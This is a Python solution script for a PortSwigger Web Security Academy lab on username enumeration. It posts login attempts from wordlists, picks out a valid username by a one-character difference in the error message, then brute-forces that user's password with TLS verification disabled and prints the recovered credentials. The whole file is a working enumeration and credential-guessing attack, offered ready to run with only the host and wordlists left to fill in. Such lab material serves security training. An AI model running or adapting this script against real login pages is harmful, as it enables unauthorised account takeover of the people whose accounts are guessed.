#!/usr/bin/env python3

# Lab: Username enumeration via subtly different responses

import hashlib
import requests
import sys
import urllib3

### CONFIGURE THESE VALUES ###
host = "<your_host>.web-security-academy.net"
path = "login"
usernames_file = "<path_to_file>"
passwords_file = "<path_to_file>"
##############################

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def valid_credential(username, password=''):
	url = "https://{host}/{path}".format(host=host, path=path)
	#proxies = {"https":"https://127.0.0.1:8080"}
	headers = {
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
	}
	if (password==''):
		data = "username={u}&password={p}".format(u=username, p='anything')
		response = requests.post(url, headers=headers, data=data, verify=False)
		return "Invalid username or password." not in response.text
	else:
		data = "username={u}&password={p}".format(u=username, p=password)
		response = requests.post(url, headers=headers, data=data, verify=False)
		return "Invalid username or password" not in response.text

if __name__ == "__main__":
	with open(usernames_file, 'r') as f:
		for line in f:
			if valid_credential(line.strip()):
				username = line.strip()
				break

	with open(passwords_file, 'r') as f:
		for line in f:
			if valid_credential(username, line.strip()):
				password = line.strip()
				break

	print("Completed. Credentials found: {username}:{password}".format(username=username, password=password))
